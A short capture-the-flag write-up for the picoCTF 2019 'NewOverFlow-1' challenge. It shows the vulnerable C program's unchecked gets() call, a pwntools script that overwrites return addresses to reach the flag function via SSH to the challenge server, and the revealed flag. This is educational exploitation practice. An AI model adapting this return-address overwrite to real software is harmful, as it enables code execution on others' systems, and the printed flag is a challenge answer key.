# NewOverFlow-1
```cpp
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
}
```
We need to call vuln again.

However using the same aproach as [overflow 1](../3-overflow-1) gives a segfault. Due to stack alginment reasons it wount. However [people](https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/binary-exploitation/#solution-4) [figured](https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/NewOverFlow-1.md) out that by puting the main address before the flag adress, it somehow makes the stack align.

Using radare2 to get the jump points, we can adapt previous code to get this.
```python
from os import environ
from pwn import *

PATH='/problems/newoverflow-1_1_39d472170ee5080cac1226374a7101a7'
EXEC='vuln'

flag_call_adr = 0x00400767
main_call_adr = 0x004007e8

send = (0x40+8)*b'x' + p64(main_call_adr) + p64(flag_call_adr)

s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter('Welcome to 64-bit. Give me a string that gets you the flag: ', send)
sh.sendline(b' ')
x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
```
flag: `picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_cfe23f2b}`